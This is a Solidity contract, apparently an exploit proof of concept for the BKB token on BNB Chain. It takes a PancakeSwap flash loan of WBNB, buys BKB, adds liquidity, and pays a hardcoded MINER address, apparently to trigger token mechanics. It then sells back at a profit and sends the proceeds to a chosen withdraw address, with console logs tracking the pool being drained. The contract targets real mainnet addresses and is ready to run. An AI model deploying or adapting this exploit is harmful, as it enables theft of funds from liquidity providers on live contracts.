//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

contract Bot is Ownable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions private WBNB_WBNB_POOL = IUniswapV3PoolActions(0x36696169C63e42cd08ce11f5deeBbCeBae652050);

    IUniswapV2Router private constant UNISWAP_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniswapV2Pair private constant WBNB_BKB_PAIR = IUniswapV2Pair(0x9f08bb067428737F7Dd21FBF0cb1aE8de84Cf2f4);

    ERC20 private constant WBNB = ERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ERC20 private constant BKB = ERC20(0xF3d9A9ec890587f4f7aEB4908f2fab6884999999);

    address private MINER = 0x7B16b5066b9D6be81FB187369310Ff8828a34aCd;

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        UNISWAP_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), 0);
    }

    function pancakeV3FlashCallback(uint256, uint256 fee, bytes calldata data) external {
        (uint256 borrowAmount, uint256 swapAmount) = abi.decode(data, (uint256, uint256));

        console.log("Before buy");
        console.log("Pool WBNB balance =>", WBNB.balanceOf(address(WBNB_BKB_PAIR)) / 1 ether);
        console.log("Pool BKB balance =>", BKB.balanceOf(address(WBNB_BKB_PAIR)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(address(WBNB), address(BKB), swapAmount, address(this));

        console.log("After buy");
        console.log("Before add liquidity");
        console.log("Pool WBNB balance =>", WBNB.balanceOf(address(WBNB_BKB_PAIR)) / 1 ether);
        console.log("Pool BKB balance =>", BKB.balanceOf(address(WBNB_BKB_PAIR)) / 1 ether);
        console.log("Bot WBNB balance =>", WBNB.balanceOf(address(this)) / 1 ether);
        console.log("Bot BKB balance =>", BKB.balanceOf(address(this)) / 1 ether);
        console.log();

        WBNB.approve(address(UNISWAP_ROUTER), type(uint256).max);
        BKB.approve(address(UNISWAP_ROUTER), type(uint256).max);

        UNISWAP_ROUTER.addLiquidity(
            address(WBNB),
            address(BKB),
            WBNB.balanceOf(address(this)),
            BKB.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );

        uint256 beforeBalance = BKB.balanceOf(address(this));

        payable(MINER).call{value: 0.0001 ether}("");

        uint256 afterBalance = BKB.balanceOf(address(this));

        console.log("Balance change =>", afterBalance - beforeBalance);

        console.log("After add liquidity");
        console.log("Before sell");
        console.log("Pool WBNB balance =>", WBNB.balanceOf(address(WBNB_BKB_PAIR)) / 1 ether);
        console.log("Pool BKB balance =>", BKB.balanceOf(address(WBNB_BKB_PAIR)) / 1 ether);
        console.log("Bot WBNB balance =>", WBNB.balanceOf(address(this)) / 1 ether);
        console.log("Bot BKB balance =>", BKB.balanceOf(address(this)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(BKB), address(WBNB), BKB.balanceOf(address(this)), address(this)
        );

        console.log("After sell");
        console.log("Pool WBNB balance =>", WBNB.balanceOf(address(WBNB_BKB_PAIR)) / 1 ether);
        console.log("Pool BKB balance =>", BKB.balanceOf(address(WBNB_BKB_PAIR)) / 1 ether);
        console.log("Bot WBNB balance =>", WBNB.balanceOf(address(this)) / 1 ether);
        console.log("Bot BKB balance =>", BKB.balanceOf(address(this)) / 1 ether);
        console.log();

        require(WBNB.balanceOf(address(this)) > borrowAmount + fee, "No profit");

        WBNB.transfer(address(WBNB_WBNB_POOL), borrowAmount + fee);
    }

    function main(uint256 flashLoanAmount, uint256 swapAmount, address withdrawAddress) public payable onlyOwner {
        flashLoanAmount = flashLoanAmount * 1 ether;
        swapAmount = swapAmount * 1 ether;

        bytes memory params = abi.encode(flashLoanAmount, swapAmount);

        WBNB_WBNB_POOL.flash(address(this), 0, flashLoanAmount, params);

        WBNB.transfer(withdrawAddress, WBNB.balanceOf(address(this)));

        console.log("Profit =>", (WBNB.balanceOf(withdrawAddress)) / 1 ether);
        console.log();
    }
}
